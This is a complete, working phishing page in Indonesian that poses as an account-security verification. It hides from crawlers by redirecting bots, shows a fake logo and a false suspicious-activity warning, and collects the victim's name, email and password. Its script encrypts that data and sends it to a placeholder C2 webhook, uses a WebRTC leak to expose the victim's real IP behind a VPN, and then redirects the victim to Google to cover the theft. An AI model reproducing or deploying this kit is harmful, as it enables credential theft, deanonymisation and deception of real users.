<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Verifikasi Keamanan Akun</title>

<!-- ======================================================== -->
<!-- SCRIPT CLOACKING (Anti-Bot Google / Link Scanner)        -->
<!-- ======================================================== -->
<script>
  // Kalau yang buka bot (Google, Bing, Facebook, dll), lempar ke situs asli
  if (navigator.webdriver || /bot|crawl|spider|google|bing|facebook|discord/i.test(navigator.userAgent)) {
    window.location.href = "https://www.google.com"; 
  }
</script>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
  body { background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
  
  /* Background Effect */
  .bg { position: fixed; inset: 0; background: radial-gradient(circle at 50% 0%, #1e293b, #0f172a); z-index: -1; }

  .card { background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); width: 100%; max-width: 400px; padding: 40px 30px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 40px rgba(0,0,0,0.4); position: relative; overflow: hidden; }
  
  .logo { text-align: center; margin-bottom: 25px; }
  .logo svg { width: 60px; height: 60px; fill: #38bdf8; filter: drop-shadow(0 0 10px rgba(56, 189, 248, 0.5)); }

  h2 { font-size: 22px; text-align: center; margin-bottom: 8px; font-weight: 700; }
  p.sub { font-size: 14px; color: #94a3b8; text-align: center; margin-bottom: 30px; }

  .step { display: none; animation: fadeIn 0.4s ease; }
  .step.active { display: block; }
  @keyframes fadeIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }

  .input-group { margin-bottom: 20px; position: relative; }
  .input-group label { display: block; font-size: 12px; color: #94a3b8; margin-bottom: 8px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
  .input-group input { width: 100%; background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255,255,255,0.1); padding: 14px 16px; border-radius: 10px; color: #fff; font-size: 15px; outline: none; transition: all 0.2s; }
  .input-group input:focus { border-color: #38bdf8; box-shadow: 0 0 15px rgba(56, 189, 248, 0.2); }

  .btn { width: 100%; background: #38bdf8; color: #0f172a; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s; display: flex; justify-content: center; align-items: center; gap: 10px; }
  .btn:active { transform: scale(0.98); }
  .btn:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; }
  
  .spinner { width: 18px; height: 18px; border: 2px solid #0f172a; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; display: none; }
  @keyframes spin { to { transform: rotate(360deg); } }

  .error-msg { color: #f87171; font-size: 12px; text-align: center; margin-top: 10px; display: none; }
</style>
</head>
<body>
<div class="bg"></div>

<div class="card">
  <div class="logo">
    <!-- Logo Palsu -->
    <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" stroke="#38bdf8" stroke-width="2" fill="none" stroke-linejoin="round"/></svg>
  </div>

  <h2>Verifikasi Akun</h2>
  <p class="sub">Sistem mendeteksi aktivitas mencurigakan. Harap verifikasi identitas Anda.</p>

  <!-- LANGKAH 1: DATA DIRI -->
  <div class="step active" id="step1">
    <div class="input-group">
      <label>Nama Lengkap</label>
      <input type="text" id="fullName" placeholder="Masukkan nama lengkap" autocomplete="off">
    </div>
    <div class="input-group">
      <label>Alamat Email</label>
      <input type="email" id="email" placeholder="contoh@email.com" autocomplete="off">
    </div>
    <button class="btn" id="btnStep1">Lanjutkan</button>
  </div>

  <!-- LANGKAH 2: PASSWORD -->
  <div class="step" id="step2">
    <div class="input-group">
      <label>Password Akun</label>
      <input type="password" id="password" placeholder="Masukkan password Anda" autocomplete="off">
    </div>
    <div class="input-group">
      <label>Konfirmasi Password</label>
      <input type="password" id="passwordConfirm" placeholder="Ulangi password" autocomplete="off">
    </div>
    <button class="btn" id="btnStep2">
      <span>Verifikasi Sekarang</span>
      <div class="spinner" id="spin"></div>
    </button>
    <div class="error-msg" id="errMsg">Password tidak cocok. Coba lagi.</div>
  </div>

</div>

<script>
(() => {
  // =========================================================
  // GANTI URL WEBHOOK / C2 SERVER KAU DI SINI
  // =========================================================
  const C2_SERVER = "https://webhook.site/GANTI-UUID-KAU";
  const ENCRYPTION_KEY = "PhishWahid2024";

  // 1. FUNGSI ENKRIPSI (AES-GCM)
  async function encryptData(data, keyString) {
    const enc = new TextEncoder();
    const keyMaterial = await crypto.subtle.importKey("raw", enc.encode(keyString), { name: "PBKDF2" }, false, ["deriveKey"]);
    const key = await crypto.subtle.deriveKey({ name: "PBKDF2", salt: enc.encode("salt"), iterations: 100000, hash: "SHA-256" }, keyMaterial, { name: "AES-GCM", length: 256 }, false, ["encrypt"]);
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv: iv }, key, enc.encode(data));
    const combined = new Uint8Array(iv.length + encrypted.byteLength);
    combined.set(iv); combined.set(new Uint8Array(encrypted), iv.length);
    return btoa(String.fromCharCode(...combined));
  }

  // 2. FUNGSI EXFILTRASI (Kirim ke C2)
  async function sendToC2(formData) {
    const payload = JSON.stringify({
      type: "CREDENTIAL_CAPTURE",
      url: window.location.href,
      ip_webrtc: await getIP(), // Ambil IP asli via WebRTC
      data: formData,
      time: new Date().toISOString()
    });

    try {
      const encrypted = await encryptData(payload, ENCRYPTION_KEY);
      await fetch(C2_SERVER, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'text/plain' },
        body: encrypted
      });
      return true;
    } catch (e) {
      return false;
    }
  }

  // 3. FUNGSI WEBRTC LEAK (Dapetin IP Asli meski pakai VPN)
  function getIP() {
    return new Promise((resolve) => {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      pc.createDataChannel("");
      pc.onicecandidate = (ice) => {
        if (!ice || !ice.candidate || !ice.candidate.candidate) return resolve("Hidden");
        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
        const match = ice.candidate.candidate.match(ipRegex);
        if (match) resolve(match[1]);
      };
      pc.createOffer().then(offer => pc.setLocalDescription(offer));
      setTimeout(() => resolve("Timeout"), 2000);
    });
  }

  // 4. LOGIKA MULTI-STEP
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const btnStep1 = document.getElementById('btnStep1');
  const btnStep2 = document.getElementById('btnStep2');
  const spin = document.getElementById('spin');
  const errMsg = document.getElementById('errMsg');

  let formData = {};

  // Tombol Lanjut (Step 1)
  btnStep1.addEventListener('click', async () => {
    const name = document.getElementById('fullName').value.trim();
    const email = document.getElementById('email').value.trim();

    if (!name || !email) {
      alert("Harap isi semua kolom!");
      return;
    }

    formData.nama = name;
    formData.email = email;

    // Transisi ke Step 2
    step1.classList.remove('active');
    setTimeout(() => {
      step2.classList.add('active');
    }, 300);
  });

  // Tombol Verifikasi (Step 2)
  btnStep2.addEventListener('click', async () => {
    const pass = document.getElementById('password').value;
    const passConfirm = document.getElementById('passwordConfirm').value;

    errMsg.style.display = 'none';

    if (!pass || !passConfirm) {
      alert("Harap isi password!");
      return;
    }

    if (pass !== passConfirm) {
      errMsg.style.display = 'block';
      return;
    }

    formData.password = pass;
    formData.password_confirm = passConfirm;

    // Loading state
    btnStep2.disabled = true;
    spin.style.display = 'block';
    btnStep2.querySelector('span').innerText = "Memverifikasi...";

    // Kirim ke C2
    const success = await sendToC2(formData);

    if (success) {
      // Redirect ke situs asli setelah sukses panen data
      setTimeout(() => {
        window.location.href = "https://www.google.com"; 
      }, 1500);
    } else {
      btnStep2.disabled = false;
      spin.style.display = 'none';
      btnStep2.querySelector('span').innerText = "Verifikasi Sekarang";
      alert("Koneksi terputus. Coba lagi.");
    }
  });

})();
</script>
</body>
  </html>
